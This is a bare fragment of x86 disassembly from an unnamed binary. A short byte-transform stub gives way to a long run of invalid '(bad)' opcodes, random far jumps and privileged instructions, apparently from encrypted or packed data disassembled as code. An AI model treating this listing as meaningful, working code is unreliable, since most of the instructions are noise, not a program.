  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    bh,0x46
  40826a:	(bad)  
  40826b:	mov    dl,0x37
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x40824c
  408275:	bound  edi,QWORD PTR [eax]
  408277:	jmp    0xbef2:0x91f4c09
  40827e:	fnstcw WORD PTR [eax]
  408280:	push   cs
  408281:	add    DWORD PTR [eax+ebp*8+0x5f],0xcac57f3
  408289:	or     BYTE PTR [ebx],0xae
  40828c:	dec    ebx
  40828d:	sbb    DWORD PTR [ecx-0x2b3e47af],esp
  408293:	adc    bl,ch
  408295:	shl    BYTE PTR [ebp+0x326b17c4],0x70
  40829c:	outs   dx,DWORD PTR ds:[esi]
  40829d:	pushf  
  40829e:	scas   eax,DWORD PTR es:[edi]
  40829f:	outs   dx,DWORD PTR ds:[esi]
  4082a0:	stos   DWORD PTR es:[edi],eax
  4082a1:	(bad)  
  4082a2:	mov    esi,0x578f9a62
  4082a7:	outs   dx,DWORD PTR ds:[esi]
  4082a8:	out    dx,eax
  4082a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082aa:	sub    al,0x7f
  4082ac:	xor    edx,DWORD PTR [eax]
  4082ae:	adc    dl,BYTE PTR [ecx-0x617671e2]
  4082b4:	jbe    0x4082b8
  4082b6:	out    dx,al
  4082b7:	pop    ds
  4082b8:	mov    ecx,cs
  4082ba:	aas    
  4082bb:	pop    ss
  4082bc:	ins    DWORD PTR es:[edi],dx
  4082bd:	adc    DWORD PTR ds:0x55b8148e,edx
  4082c3:	ss jmp 0x4082f9
  4082c6:	cwde   
  4082c7:	repnz sub eax,DWORD PTR [esi+0x39be2d1a]
  4082ce:	mov    DWORD PTR [ecx],edi
  4082d0:	fnstsw WORD PTR [esi]
  4082d2:	xor    esp,DWORD PTR [edx+esi*4+0x1265ac09]
  4082d9:	ins    DWORD PTR es:[edi],dx
  4082da:	xchg   esi,eax
  4082db:	inc    ecx
  4082dc:	add    ah,BYTE PTR [ebp-0x5feff505]
  4082e2:	mov    ah,0x6b
  4082e4:	inc    edi
  4082e5:	or     edi,0x3da57bd1
  4082eb:	mov    al,0x5a
  4082ed:	inc    eax
  4082ee:	sbb    ebp,DWORD PTR [edx]
  4082f0:	adc    BYTE PTR [esi-0x2a3819d1],0x22
  4082f7:	cli    
  4082f8:	pop    ecx
  4082f9:	mov    ds:0xb57aaca,eax
  4082fe:	into   
  4082ff:	scas   al,BYTE PTR es:[edi]
  408300:	loopne 0x40835a
  408302:	dec    ebx
  408303:	test   eax,0x50f41e2a
  408308:	jecxz  0x40837c
  40830a:	mov    edi,0x227f7f28
  40830f:	pop    esp
  408310:	sar    DWORD PTR [ebp+0x5542a877],1
  408316:	je     0x40832a
  408318:	dec    ebx
  408319:	push   ds
  40831a:	push   esp
  40831b:	pop    ecx
  40831c:	inc    edi
  40831d:	inc    esi
  40831e:	ja     0x408311
  408320:	add    eax,0xeef68f75
  408325:	dec    ebx
  408326:	das    
  408327:	sbb    BYTE PTR [ebx],ah
  408329:	sbb    dh,dh
  40832b:	stos   DWORD PTR es:[edi],eax
  40832c:	aas    
  40832d:	cmc    
  40832e:	gs iret 
  408330:	sbb    BYTE PTR [esi],0x21
  408333:	repnz pusha 
  408335:	mov    ebp,0x75f10261
  40833a:	imul   esi,DWORD PTR [ecx],0x86122dde
  408340:	repz sar BYTE PTR ds:0x73661858,1
  408347:	jns    0x4083a3
  408349:	mov    esp,0x8323b462
  40834e:	xor    DWORD PTR [edi-0x39],esp
  408351:	xor    eax,0x5fbc0635
  408356:	mov    dl,0x74
  408358:	push   edi
  408359:	add    DWORD PTR [ebx-0x71],0x702ebbab
  408360:	mov    BYTE PTR [ecx],al
  408362:	xor    esi,DWORD PTR [ebx+0x1db29e1b]
  408368:	push   edx
  408369:	imul   edx,DWORD PTR [esi],0xffffff81
  40836c:	sbb    edx,ebx
  40836e:	jbe    0x408350
  408370:	std    
  408371:	sub    eax,DWORD PTR [edx]
  408373:	xchg   ebx,eax
  408374:	shl    BYTE PTR [ebx+0x64],1
  408377:	loope  0x408385
  408379:	dec    edi
  40837a:	xor    eax,0xa8940944
  40837f:	jl     0x4083f0
  408381:	and    bl,BYTE PTR [edx-0x4c77c062]
  408387:	nop
  408388:	shl    DWORD PTR [edx+0x51],1
  40838b:	push   esi
  40838c:	xlat   BYTE PTR ds:[ebx]
  40838d:	mov    ch,ch
  40838f:	jae    0x408384
  408391:	mov    DWORD PTR [edi+0x40],esp
  408394:	and    dh,BYTE PTR [edi+0x67]
  408397:	addr16 int 0x2d
  40839a:	int    0x63
  40839c:	ds lock inc ecx
  40839f:	jp     0x408332
  4083a1:	repz inc esi
  4083a3:	cmp    al,0xf2
  4083a5:	add    dh,al
  4083a7:	aad    0xf8
  4083a9:	stos   DWORD PTR es:[edi],eax
  4083aa:	lds    edx,FWORD PTR [ecx-0x1c]
  4083ad:	loope  0x408347
  4083af:	(bad)  
  4083b1:	call   0x9961:0x1adc617c
  4083b8:	lds    eax,FWORD PTR [ecx+0x30]
  4083bb:	sub    edi,eax
  4083bd:	sub    eax,0x95c52e26
  4083c2:	or     al,0x82
  4083c4:	dec    eax
  4083c5:	push   edx
  4083c6:	adc    edi,esi
  4083c8:	sbb    eax,0x1b1d28f0
  4083cd:	cmc    
  4083ce:	xchg   ebp,eax
  4083cf:	mov    dl,0xe6
  4083d1:	jae    0x4083db
  4083d3:	inc    ebx
  4083d4:	jb     0x408421
  4083d6:	and    al,0xea
  4083d8:	dec    esp
  4083d9:	mov    ah,0x4e
  4083db:	jmp    0x40845c
  4083dd:	sbb    eax,0x5a9d98e2
  4083e2:	push   cs
  4083e3:	rcr    BYTE PTR [ecx-0x6d],1
  4083e6:	int    0x0
  4083e8:	xchg   DWORD PTR [ecx+0x7c15ee12],eax
  4083ee:	frstor [eax+0x3c]
  4083f1:	push   ds
  4083f2:	dec    edx
  4083f3:	sub    bh,bh
  4083f5:	(bad)  
  4083f6:	push   cs
  4083f7:	imul   esi,DWORD PTR [eax-0x4ca23f49],0x36
  4083fe:	pop    edx
  4083ff:	mov    ebp,0x529ae250
  408404:	js     0x408463
  408406:	lea    edx,[edx-0x21194cdd]
  40840c:	arpl   WORD PTR [esi-0x4004e7e9],sp
  408412:	test   eax,0xfe49baca
  408417:	and    al,0x3a
  408419:	sub    DWORD PTR [ebp-0x29],ecx
  40841c:	call   0x6574b681
  408421:	inc    edx
  408422:	pop    eax
  408423:	sub    dl,BYTE PTR [esi+0x2001da89]
  408429:	lods   al,BYTE PTR ds:[esi]
  40842a:	ins    BYTE PTR es:[edi],dx
  40842b:	pop    esp
  40842c:	mov    ah,0xf5
  40842e:	mov    edi,0xd2499f6
  408433:	ficom  DWORD PTR [ecx-0x3925eefb]
  408439:	mov    al,0xdc
  40843b:	inc    eax
  40843c:	mul    BYTE PTR [esi+0x59]
  40843f:	call   0xac4a:0x7e29e857
  408446:	(bad)  
  408448:	sub    eax,0xa5ea1dba
  40844d:	mov    ecx,0x4e467bd1
  408452:	cmp    BYTE PTR [ebp+0x79],al
  408455:	das    
  408456:	jne    0x408440
  408458:	lock jle 0x4084b9
  40845b:	inc    edx
  40845c:	adc    DWORD PTR [edi],0x20
  40845f:	pop    ebp
  408460:	(bad)  [edx]
  408462:	fimul  WORD PTR [ecx]
  408464:	xor    al,0x12
  408466:	hlt    
  408467:	jnp    0x408466
  408469:	sub    cl,BYTE PTR [edx-0x12]
  40846c:	inc    edx
  40846d:	loop   0x40847e
  40846f:	jnp    0x4084d1
  408471:	xchg   ecx,eax
  408472:	sub    BYTE PTR [eax],cl
  408474:	jg     0x4084c9
  408476:	mov    WORD PTR [esi-0x2a],es
  408479:	adc    edi,DWORD PTR [ecx+0x9807402]
  40847f:	rcr    DWORD PTR [esi-0x182b058a],cl
  408485:	add    BYTE PTR [edi+0x3f],cl
  408488:	out    0x40,eax
  40848a:	adc    DWORD PTR [ebx+eax*4-0x6b],esp
  40848e:	mov    esp,0xe43c32dd
  408493:	clc    
  408494:	call   0x9ccb4f05
  408499:	mov    edi,0x97d3d48
  40849e:	out    dx,al
  40849f:	push   ecx
  4084a0:	in     al,dx
  4084a1:	pop    esi
  4084a2:	mov    gs,ecx
  4084a4:	mov    ds:0xddabcc40,eax
  4084a9:	dec    esp
  4084aa:	loopne 0x408456
  4084ac:	rcl    DWORD PTR [edx+0xae88402],cl
  4084b2:	jmp    0x1922:0xdedb8443
  4084b9:	loope  0x4084ab
  4084bb:	mov    bh,0xb9
  4084bd:	and    eax,0xd35dcfc6
  4084c2:	mov    ecx,edx
  4084c4:	add    dh,bh
  4084c6:	hlt    
  4084c7:	(bad)  
  4084c8:	xor    DWORD PTR [esi-0x22fb04f6],edi
  4084ce:	fdiv   QWORD PTR [edx-0x6f]
  4084d1:	ins    BYTE PTR es:[edi],dx
  4084d2:	loope  0x4084ee
  4084d4:	jae    0x4084e3
  4084d6:	fmulp  st(4),st
  4084d8:	or     DWORD PTR [esi],0xffffffaf
  4084db:	pop    ebx
  4084dc:	add    dl,BYTE PTR [esi-0x3affe5f2]
  4084e2:	push   edi
  4084e3:	ins    BYTE PTR es:[edi],dx
  4084e4:	jns    0x408557
  4084e6:	adc    BYTE PTR ds:0x17810332,bl
  4084ec:	xor    ebx,DWORD PTR [edx]
  4084ee:	scas   eax,DWORD PTR es:[edi]
  4084ef:	data16 mov bh,0xb9
  4084f2:	jmp    0x40851d
  4084f4:	std    
  4084f5:	xor    BYTE PTR [ebp+0x33df5cf1],dl
  4084fb:	sbb    bl,0x35
  4084fe:	les    ebx,FWORD PTR [eax]
  408500:	test   DWORD PTR [ebx],edi
  408502:	(bad)  
  408503:	div    dh
  408505:	les    edi,FWORD PTR [ebp+0x5a480a25]
  40850b:	cmp    edi,DWORD PTR [edi-0x25]
  40850e:	or     BYTE PTR [ecx],ch
  408510:	add    BYTE PTR [ebp+0x14ad3640],ah
  408516:	mov    ah,0xe8
  408518:	inc    ebx
  408519:	add    esi,DWORD PTR [esi-0x4b72dce3]
  40851f:	mov    ds:0x3987ac15,eax
  408524:	dec    edi
  408525:	or     DWORD PTR [edi],ecx
  408527:	mov    gs,ebp
  408529:	mov    ch,0xc8
  40852b:	aaa    
  40852c:	fnstsw WORD PTR [edi-0x143c2f17]
  408532:	sbb    al,0x54
  408534:	pop    ebp
  408535:	sbb    ebp,ebx
  408537:	cmp    esp,DWORD PTR [ebp-0x7c851926]
  40853d:	in     eax,dx
  40853e:	mov    dl,0x8f
  408540:	dec    esp
  408541:	cmc    
  408542:	cwde   
  408543:	cmp    eax,0x7c714a42
  408548:	adc    bh,BYTE PTR [eax]
  40854a:	enter  0x2c97,0x7
  40854e:	mov    ah,0xa7
  408550:	add    eax,0x1f3e6d0f
  408555:	cmp    BYTE PTR [edx],0x2a
  408558:	imul   esp,DWORD PTR [ebp-0x40ee65a3],0x11
  40855f:	sub    esi,DWORD PTR [edi+0x7b]
  408562:	sub    edx,DWORD PTR [ebx-0x6c]
  408565:	mov    al,bl
  408567:	js     0x408545
  408569:	outs   dx,BYTE PTR ds:[esi]
  40856a:	xchg   edx,eax
  40856b:	into   
  40856c:	hlt    
  40856d:	(bad)  
  40856e:	push   esp
  40856f:	push   ebx
  408570:	iret   
  408571:	stos   BYTE PTR es:[edi],al
  408572:	dec    edx
  408573:	lock inc eax
  408575:	int    0xca
  408577:	loop   0x408529
  408579:	push   esp
  40857a:	in     eax,dx
  40857b:	lds    esp,FWORD PTR [eax+0x45]
  40857e:	jne    0x40856d
  408580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408581:	adc    al,0x2e
  408583:	fidivr WORD PTR [ebx+0x3f27e89d]
  408589:	scas   eax,DWORD PTR es:[edi]
  40858a:	cmp    DWORD PTR [edi],eax
  40858c:	test   eax,0xc2c65c2c
  408591:	fwait
  408592:	jl     0x408545
  408594:	aas    
  408595:	mov    ebp,0x3c5b1c03
  40859a:	pop    edi
  40859b:	stos   DWORD PTR es:[edi],eax
  40859c:	fwait
  40859d:	pop    esp
  40859e:	pop    ebp
  40859f:	inc    esi
  4085a0:	loopne 0x4085a2
  4085a2:	push   cs
  4085a3:	xor    ecx,DWORD PTR [eax+0x348e901]
  4085a9:	add    BYTE PTR [eax],al
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x66112ae4
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x408578
  4085c4:	imul   ebx,edi,0x3a
  4085c7:	or     eax,0xc66aa745
  4085cc:	fs out dx,al
  4085ce:	and    al,0x83
  4085d0:	mov    esi,0x228d4adf
  4085d5:	adc    al,0xeb
  4085d7:	dec    esi
  4085d8:	into   
  4085d9:	sbb    al,0x56
  4085db:	xchg   edi,eax
  4085dc:	xlat   BYTE PTR ds:[ebx]
  4085dd:	sub    eax,0x2b37119b
  4085e2:	cdq    
  4085e3:	call   0xb1202ced
  4085e8:	adc    DWORD PTR [edi],0xffffffc3
  4085eb:	stos   DWORD PTR es:[edi],eax
  4085ec:	ror    BYTE PTR [ebx],0xeb
  4085ef:	xchg   edx,eax
  4085f0:	jmp    0x5c97:0xf57a718
  4085f7:	sbb    al,0xc8
  4085f9:	mov    edx,0x3651a40
  4085fe:	in     eax,0x9c
  408600:	fnstcw WORD PTR [esi+0x2d1ef6e0]
  408606:	test   al,0x91
  408608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408609:	jbe    0x40864b
  40860b:	outs   dx,BYTE PTR ds:[esi]
  40860c:	cmp    DWORD PTR [ebx-0x1b],ebp
  40860f:	jo     0x40859b
  408611:	iret   
  408612:	sahf   
  408613:	push   esi
  408614:	(bad)
  408617:	ja     0x4085ba
  408619:	sbb    BYTE PTR [edx+0x51],bh
  40861c:	jl     0x4085e1
  40861e:	jmp    0x673:0x6bad5f3
  408625:	mov    bl,0xdc
  408627:	or     BYTE PTR [edx],al
  408629:	xor    al,0xf7
  40862b:	and    eax,0xeb17598a
  408630:	and    WORD PTR [edi],di
  408633:	pop    esp
  408634:	div    BYTE PTR [edi]
  408636:	dec    ecx
  408637:	push   ebp
  408638:	das    
  408639:	add    al,0xd0
  40863b:	pop    edx
  40863c:	je     0x4085f2
  40863e:	cli    
  40863f:	call   0xe469:0x577a9a85
  408646:	pushf  
  408647:	shl    ebp,cl
  408649:	push   0x2e
  40864b:	retf   0xc7a6
  40864e:	repz and BYTE PTR [edx+0x38],al
  408652:	xor    cl,BYTE PTR [esi+0x35]
  408655:	mov    eax,ds:0xdb5ed26e
  40865a:	dec    esp
  40865b:	aas    
  40865c:	or     al,0x93
  40865e:	xor    eax,0x79ea70ce
  408663:	mov    gs,WORD PTR [ebp+0x74bff40c]
  408669:	ins    DWORD PTR es:[edi],dx
  40866a:	ds ja  0x40868f
  40866d:	nop
  40866e:	jge    0x408652
  408670:	fsubr  QWORD PTR [edx]
  408672:	mov    ch,0x84
  408674:	mov    esp,0x3a34f86b
  408679:	jmp    0x408640
  40867b:	inc    esi
  40867c:	sbb    bh,BYTE PTR [ebp+0x10]
  40867f:	jbe    0x4086ab
  408681:	test   al,0x30
  408683:	rol    DWORD PTR [ecx+edx*8+0x6a645f0a],0x15
  40868b:	imul   ebx,DWORD PTR ds:[edx+ebx*1+0x2e],0x199c1b04
  408694:	scas   al,BYTE PTR es:[edi]
  408695:	sbb    edi,ebx
  408697:	or     DWORD PTR [eax+0x5d5d5db8],ecx
  40869d:	pop    eax
  40869e:	mov    DWORD PTR [edx-0x3dc043c5],ecx
  4086a4:	(bad)  
  4086a5:	xchg   edx,eax
  4086a6:	(bad)  
  4086a7:	clc    
  4086a8:	push   eax
  4086a9:	ficomp WORD PTR [ecx+edi*4+0x69]
  4086ad:	outs   dx,DWORD PTR ds:[esi]
  4086ae:	loop   0x4086ea
  4086b0:	jbe    0x4086b8
  4086b2:	mov    al,ds:0x7fdfad52
  4086b7:	fidivr DWORD PTR [ebx+0x4bde84a6]
  4086bd:	cmp    al,BYTE PTR cs:[ebx]
  4086c0:	xor    BYTE PTR [ebp+0x58],0xb
  4086c4:	push   ecx
  4086c5:	mov    ecx,0x465b2a9f
  4086ca:	(bad)  
  4086cb:	fwait
  4086cc:	sub    eax,0xb4ffdf66
  4086d1:	sbb    eax,0x5adb62ee
  4086d6:	mov    esp,es
  4086d8:	(bad)  
  4086d9:	repnz sub al,0xae
  4086dc:	rol    cl,cl
  4086de:	repnz ficomp DWORD PTR [ecx]
  4086e1:	inc    esi
  4086e2:	or     al,0x82
  4086e4:	rol    BYTE PTR [ecx],cl
  4086e6:	out    0x9,al
  4086e8:	sbb    DWORD PTR [eax+0x65aa1d15],esi
  4086ee:	cmp    dh,BYTE PTR [ebp+0x8]
  4086f1:	popa   
  4086f2:	and    DWORD PTR [esi],ebx
  4086f4:	int3   
  4086f5:	test   BYTE PTR [esi+0x7c],dl
  4086f8:	xchg   esp,eax
  4086f9:	in     eax,0xb2
  4086fb:	shl    DWORD PTR ds:0x15bc27b1,cl
  408701:	mov    bh,0xa9
  408703:	add    esi,DWORD PTR [esi+0x41]
  408706:	sub    eax,0xd74c772d
  40870b:	mov    ecx,0x914ac091
  408710:	cmp    ch,BYTE PTR [edi-0x46ccf723]
  408716:	sub    ch,ah
  408718:	fwait
  408719:	shl    BYTE PTR [ecx],0x6e
  40871c:	repnz fs int 0xfb
  408720:	xor    bh,BYTE PTR [esp+ecx*2]
  408723:	jb     0x40875c
  408725:	adc    esi,ebx
  408727:	xchg   ebp,eax
  408728:	repz sbb DWORD PTR [eax+ebx*4],ebx
  40872c:	cmp    al,0x7e
  40872e:	and    BYTE PTR [edi-0x14b676f9],ah
  408734:	fisttp QWORD PTR [edi]
  408736:	adc    eax,0x47201128
  40873b:	mov    ebp,0x2e4debd8
  408740:	xchg   BYTE PTR [eax],al
  408742:	mov    ah,0x49
  408744:	mov    ah,ah
  408746:	ins    BYTE PTR es:[edi],dx
  408747:	popa   
  408748:	ins    DWORD PTR es:[edi],dx
  408749:	mov    esp,0xdfc9aa9d
  40874e:	je     0x408739
  408750:	or     DWORD PTR [esi],ebx
  408752:	call   DWORD PTR [ebx+edi*4-0xc]
  408756:	(bad)  
  408757:	fild   WORD PTR [ecx]
  408759:	inc    ecx
  40875a:	adc    eax,0x312f4d52
  40875f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408760:	leave  
  408761:	push   edx
  408762:	hlt    
  408763:	cmp    DWORD PTR [esi],esi
  408765:	adc    BYTE PTR [ebp+0x4f],ch
  408768:	loope  0x408721
  40876a:	arpl   WORD PTR [eax-0x42ff292e],bx
  408770:	sar    BYTE PTR [ecx-0x19776994],1
  408776:	mov    ds:0x5fee199e,eax
  40877b:	mov    cl,0x19
  40877d:	inc    ebx
  40877e:	(bad)  
  40877f:	shr    DWORD PTR [ecx-0x295f0433],1
  408785:	sbb    al,0xec
  408787:	jnp    0x408725
  408789:	push   es
  40878a:	loop   0x408722
  40878c:	mov    esp,edi
  40878e:	mov    eax,ds:0x9f3539b6
  408793:	popa   
  408794:	adc    eax,0x34c6a22e
  408799:	push   edi
  40879a:	popf   
  40879b:	or     eax,0x817e1dc6
  4087a0:	adc    al,0x98
  4087a2:	inc    ebx
  4087a3:	cmp    esi,edx
  4087a5:	add    DWORD PTR [edx+0x36],ecx
  4087a8:	jnp    0x4087d8
  4087aa:	shl    BYTE PTR [ebx+0x1d],cl
  4087ad:	pop    esi
  4087ae:	ja     0x408807
  4087b0:	push   eax
  4087b1:	push   ebp
  4087b2:	inc    edi
  4087b4:	lock jecxz 0x4087b2
  4087b7:	dec    esp
  4087b8:	scas   al,BYTE PTR es:[edi]
  4087b9:	arpl   WORD PTR [ecx+0x68],bx
  4087bc:	push   es
  4087bd:	into   
  4087be:	add    ah,BYTE PTR [ebp+0xb]
  4087c1:	xor    eax,0xe8861511
  4087c6:	scas   eax,DWORD PTR es:[edi]
  4087c7:	sub    al,0xf
  4087c9:	fdiv   DWORD PTR [edi+0x7e]
  4087cc:	add    BYTE PTR [ebx],ch
  4087ce:	xchg   esi,eax
  4087cf:	in     al,0x61
  4087d1:	pop    es
  4087d2:	fadd   DWORD PTR [eax+ebx*1+0x52]
  4087d6:	mov    esi,0x843bb117
  4087db:	mov    ds:0x491ec75f,eax
  4087e0:	enter  0x25c0,0x2e
  4087e4:	mov    bl,0x3c
  4087e6:	fcom   QWORD PTR [ecx+0x126d44d0]
  4087ec:	mov    eax,0xf332379b
  4087f1:	int    0x2
  4087f3:	pusha  
  4087f4:	jae    0x4087d2
  4087f6:	jns    0x4087a4
  4087f8:	xchg   ebp,eax
  4087f9:	ffreep st(7)
  4087fb:	xchg   edi,eax
  4087fc:	outs   dx,DWORD PTR ds:[esi]
  4087fd:	xor    al,BYTE PTR [ebx-0x1639d633]
  408803:	jno    0x408801
  408805:	mov    ah,0x22
  408807:	dec    esp
  408808:	in     eax,0xbc
  40880a:	out    dx,al
  40880b:	sub    BYTE PTR [ebp+0x48b55c61],bh
  408811:	dec    eax
  408812:	or     al,0x24
  408814:	jecxz  0x4087e7
  408816:	mov    DWORD PTR [eax+0xb061259],esi
  40881c:	and    eax,0xb1254abe
  408821:	pop    ecx
  408822:	push   0x418f4f7f
  408827:	mov    bl,0x85
  408829:	shr    DWORD PTR [edi+0x31625d0d],1
  40882f:	jmp    0x4087cf
  408831:	stos   DWORD PTR es:[edi],eax
  408832:	jae    0x40887e
  408834:	pop    ecx
  408835:	push   esi
  408836:	xchg   ebx,eax
  408837:	jg     0x40887a
  408839:	mov    al,ds:0xc47daac
  40883e:	mov    al,ds:0x9fc8a0b6
  408843:	(bad)  
  408845:	xlat   BYTE PTR ds:[ebx]
  408846:	jne    0x4087fc
  408848:	mov    eax,ds:0x57ccff58
  40884d:	in     al,dx
  40884e:	jae    0x408820
  408850:	std    
  408851:	out    dx,al
  408852:	cmp    DWORD PTR [edi+esi*4+0x713c60e],esp
  408859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885a:	aaa    
  40885b:	dec    BYTE PTR ss:[eax+ebp*4+0x0]
  408860:	imul   eax,esi,0x47
  408863:	adc    BYTE PTR [edi+ebx*4],0x16
  408867:	add    ch,bh
  408869:	outs   dx,BYTE PTR ds:[esi]
  40886a:	imul   edx,DWORD PTR [esp+eiz*2+0x2b],0xfb39759b
  408872:	in     eax,0xb0
  408874:	es push edx
  408876:	push   ebp
  408877:	and    ebx,DWORD PTR [eax-0x39]
  40887a:	sub    BYTE PTR ds:0x1522d746,bh
  408880:	mov    eax,0xc2211506
  408885:	arpl   WORD PTR [ebx+0x4f3719ce],si
  40888b:	scas   eax,DWORD PTR es:[edi]
  40888c:	pop    eax
  40888d:	mov    ebp,DWORD PTR [eax+0x73]
  408890:	fistp  WORD PTR [ecx-0x11c709bb]
  408896:	cs nop
  408898:	and    DWORD PTR [edi-0x6fd641d7],ebx
  40889e:	jnp    0x408871
  4088a0:	lds    eax,FWORD PTR [ebp-0x77]
  4088a3:	inc    ebx
  4088a4:	jmp    0x4381:0x9166836
  4088ab:	mov    DWORD PTR [eax],ebx
  4088ad:	dec    esi
  4088ae:	xchg   BYTE PTR [ebx-0x686135eb],bl
  4088b4:	add    eax,0x65e00e4
  4088b9:	icebp  
  4088ba:	std    
  4088bb:	adc    al,BYTE PTR [ebx]
  4088bd:	addr16 mov ecx,gs
  4088c0:	jecxz  0x408895
  4088c2:	ds cmp ch,dl
  4088c5:	inc    edi
  4088c6:	in     al,0xe1
  4088c8:	inc    ebp
  4088c9:	test   bl,cl
  4088cb:	xor    DWORD PTR [ecx],0x3bc30b06
  4088d1:	fistp  QWORD PTR [ebx]
  4088d3:	dec    esi
  4088d4:	scas   eax,DWORD PTR es:[edi]
  4088d5:	fs stos DWORD PTR es:[edi],eax
  4088d7:	pop    ss
  4088d8:	cmc    
  4088d9:	pop    edi
  4088da:	mov    ecx,0x7f10145
  4088df:	cmc    
  4088e0:	push   eax
  4088e1:	push   esp
  4088e2:	sbb    DWORD PTR [edi+esi*8-0x1512a43c],ebp
  4088e9:	jae    0x40896a
  4088eb:	pushf  
  4088ec:	sub    DWORD PTR [edx],ecx
  4088ee:	hlt    
  4088ef:	imul   esi,DWORD PTR [ebx],0xffffffd7
  4088f2:	mov    ah,0x8d
  4088f4:	inc    ebp
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x2abca301],cl
  40890c:	test   ecx,esp
  40890e:	jle    0x4088a7
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x4088f1
  408918:	outs   dx,DWORD PTR ds:[esi]
  408919:	aas    
  40891a:	sar    BYTE PTR ds:[ebx+0x5aff73e8],0xe0
  408922:	sbb    al,0x8d
  408924:	sub    cl,BYTE PTR [edx+0x7a261e91]
  40892a:	popa   
  40892b:	adc    DWORD PTR [esi-0x37a7cf66],ecx
  408931:	and    eax,DWORD PTR [eax+eiz*8-0x16]
  408935:	mov    esi,0x5b946531
  40893a:	push   es
  40893b:	dec    ebp
  40893c:	js     0x4089a1
  40893e:	das    
  40893f:	mov    ds:0xa75864c4,al
  408944:	js     0x408961
  408946:	call   0xb1a9:0x39ef6459
  40894d:	add    al,0x5c
  40894f:	sub    BYTE PTR [ebx+edx*2+0x493a3fd3],0x78
  408957:	stos   BYTE PTR es:[edi],al
  408958:	loop   0x4088e6
  40895a:	fs aas 
  40895c:	pop    ss
  40895d:	icebp  
  40895e:	jbe    0x408973
  408960:	adc    ecx,DWORD PTR [ebx]
  408962:	ret    
  408963:	mov    esp,edi
  408965:	pop    es
  408966:	jns    0x4089b7
  408968:	je     0x40894f
  40896a:	jnp    0x40896b
  40896c:	call   0xdfde86dd
  408971:	ins    BYTE PTR es:[edi],dx
  408972:	lock add eax,0x1c773fc0
  408978:	pusha  
  408979:	jb     0x4089aa
  40897b:	cmp    eax,0x1a52ce4d
  408980:	lods   al,BYTE PTR ds:[esi]
  408981:	jle    0x40893f
  408983:	call   0x59e0:0x75d17cda
  40898a:	xor    eax,0x7af00c82
  40898f:	push   0xffffffcd
  408991:	and    esp,DWORD PTR [esi-0xb1179ca]
  408997:	(bad)  [eax-0x3b0c5e1c]
  40899d:	sar    eax,1
  40899f:	inc    eax
  4089a0:	xchg   esp,eax
  4089a1:	cli    
  4089a2:	fisttp DWORD PTR [edx]
  4089a4:	xor    eax,0xa8e51ed5
  4089a9:	pop    esi
  4089aa:	adc    eax,0x2a814454
  4089af:	lock xlat BYTE PTR ds:[ebx]
  4089b1:	sbb    eax,edi
  4089b3:	into   
  4089b4:	mov    al,ds:0xed924a39
  4089b9:	fnstsw WORD PTR [eax-0x6b44f699]
  4089bf:	(bad)  
  4089c0:	repz sbb DWORD PTR [ecx],edx
  4089c3:	and    al,0x9f
  4089c5:	add    dl,al
  4089c7:	mov    ds:0x508bdf9b,eax
  4089cc:	in     eax,0xc6
  4089ce:	jl     0x4089d0
  4089d0:	lods   al,BYTE PTR ds:[esi]
  4089d1:	jle    0x408956
  4089d3:	stos   BYTE PTR es:[edi],al
  4089d4:	sub    al,0xb
  4089d6:	icebp  
  4089d7:	jl     0x4089c7
  4089d9:	add    esi,DWORD PTR ss:[ebp+0x640d6616]
  4089e0:	or     eax,0xff80bfd8
  4089e5:	vunpckhpd ymm1,ymm6,YMMWORD PTR [edx]
  4089e9:	xor    DWORD PTR [edi+0x74],0xffffffde
  4089ed:	pop    es
  4089ee:	dec    ebx
  4089ef:	sbb    DWORD PTR [esi-0x65],0xfffffffc
  4089f3:	pop    fs
  4089f5:	jp     0x408a70
  4089f7:	fstp   TBYTE PTR [edx+0x6b3e0da8]
  4089fd:	les    ecx,FWORD PTR [ebp-0xc5af2e6]
  408a03:	pop    ecx
  408a04:	retf   0xc881
  408a07:	pop    edx
  408a08:	cmp    esi,DWORD PTR [ebx-0x1a13dbbd]
  408a0e:	cld    
  408a0f:	cmp    BYTE PTR [edx],dh
  408a11:	inc    ecx
  408a12:	jmp    0x266b:0xa699852
  408a19:	mov    eax,ds:0xda1178cd
  408a1e:	mov    ch,0xd5
  408a20:	out    dx,eax
  408a21:	mov    ebp,0x75bc7de2
  408a26:	sahf   
  408a27:	add    eax,0xbaec4d43
  408a2c:	iret   
  408a2d:	inc    eax
  408a2e:	clc    
  408a2f:	pop    ss
  408a30:	and    BYTE PTR [ecx],bh
  408a32:	dec    ebp
  408a33:	adc    DWORD PTR [esi-0x9bd5993],ebp
  408a39:	or     DWORD PTR [edi+0x7a4854a8],0xffffffe1
  408a40:	jbe    0x4089e7
  408a42:	cli    
  408a43:	scas   eax,DWORD PTR es:[edi]
  408a44:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  408a46:	pop    ds
  408a47:	mov    eax,ds:0x266c9d8f
  408a4c:	sbb    ch,al
  408a4e:	(bad)  
